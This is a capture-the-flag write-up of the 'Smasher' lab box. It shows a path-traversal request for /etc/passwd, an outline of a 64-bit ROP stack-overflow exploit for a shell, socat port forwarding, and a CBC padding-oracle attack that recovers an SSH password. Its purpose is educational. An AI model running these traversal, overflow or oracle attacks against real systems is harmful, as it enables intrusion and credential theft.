## Overview

Smasher is an insane-difficulty Linux box that leans almost entirely on classic binary and crypto exploitation rather than web bugs. The path to user starts with a path-traversal flaw in a tiny custom web server that hands us its own source code, binary, and libc — everything needed to craft a return-oriented-programming (ROP) exploit against a stack buffer overflow for a shell as `www`. From there, a local-only "AES checker" service leaks padding errors, and a padding-oracle attack decrypts a stored message containing user `smasher`'s SSH password. This post covers recon through the user flag.

Pure binary/crypto exploitation: path-traversal source leak feeds a 64-bit ROP stack overflow for www, then a CBC padding-oracle attack recovers smasher's SSH password; custom is overwhelmingly dominant.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 1111 | shenfeng tiny-web-server |

```bash
ports=$(nmap -p- --min-rate=1000 -T4 <ip> | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV <ip>
```

SSH is standard and not the way in. The interesting service is on port 1111 — `shenfeng tiny-web-server`, an open-source hobby HTTP server written in C. Because its source is public on GitHub, we can read exactly how it handles requests.

## Enumeration

`tiny-web-server` builds the path to the file it serves by simple string handling, with no protection against directory traversal. Requesting paths that climb out of the web root returns arbitrary files:

```bash
curl --path-as-is -s "http://<ip>:1111//etc/passwd"
```

`/etc/passwd` reveals a user `www` with a home directory containing the server's own source tree. We pull the source, the compiled binary, and the box's libc so we can build a precise exploit offline:

```bash
wget http://<ip>:1111//home/www/tiny-web-server/tiny    -O tiny
wget http://<ip>:1111//home/www/tiny-web-server/tiny.c  -O tiny.c
wget http://<ip>:1111//lib/x86_64-linux-gnu/libc.so.6   -O libc.so.6
```

Two findings stand out. First, `checksec` shows the binary was built with **NX disabled and no PIE** — addresses are constant and the stack is executable-friendly, removing most modern mitigations. Second, diffing `tiny.c` against the upstream repo shows the box's copy was edited to **remove the per-request fork loop**, which keeps us on the parent process so a crash is actually exploitable:

```bash
checksec --file=tiny
git clone https://github.com/shenfeng/tiny-web-server
vimdiff tiny.c tiny-web-server/tiny.c
```

Reading the source, `url_decode()` copies up to `MAXLINE` (1024) bytes into a 512-byte filename buffer — a textbook stack buffer overflow.

## Foothold

### 1. Find the offset

A pattern of 1024 bytes crashes the server; inspecting the saved return address shows the overflow reaches RIP at **offset 568**, leaving plenty of room for a ROP chain.

```bash
curl localhost:9999/$(msf-pattern_create -l 1024)
```

### 2. Stage 1 — leak libc

There's no `puts` in the binary, but `write` is present. We build a ROP chain that calls `write(4, read@GOT, …)` to leak the runtime address of `read`, which (knowing the libc we downloaded) gives us the libc base despite ASLR.

### 3. Stage 2 — get a shell

With the libc base we compute `system` and `/bin/sh`, then chain `dup2(4, 0)` + `dup2(4, 1)` to wire our socket to stdin/stdout, followed by `system("/bin/sh")`. The full pwntools exploit lands a shell as `www`:

```bash
python3 exploit.py   # 64-bit ROP: leak write@libc -> dup2(4,0/1) -> system("/bin/sh")
```

### 4. Lateral to smasher via the AES oracle

`www` can't read `user.txt` — it belongs to `smasher`. A loopback-only service on port 1337 turns out to be an "AES checker" that decrypts submitted CBC ciphertext and returns a distinct `Invalid Padding!` error for bad padding. That distinguishable response is a **padding oracle**: we can decrypt CBC data one byte at a time without the key.

First expose the local port outward with a static `socat`:

```bash
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat tcp-listen:5555,fork,reuseaddr tcp:127.0.0.1:1337 &
```

Then run the `python-paddingoracle` library against it. The decrypted plaintext literally reads "SSH password for user 'smasher' is: `<redacted>`", which logs us in over SSH:

```bash
git clone https://github.com/mwielgoszewski/python-paddingoracle
python smasher-paddingoracle.py <b64-ciphertext>
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no smasher@<ip>
```

## User flag

```bash
cat /home/smasher/user.txt   # HTB{...}
```

Access as `smasher` achieved through binary exploitation followed by a padding-oracle credential leak.
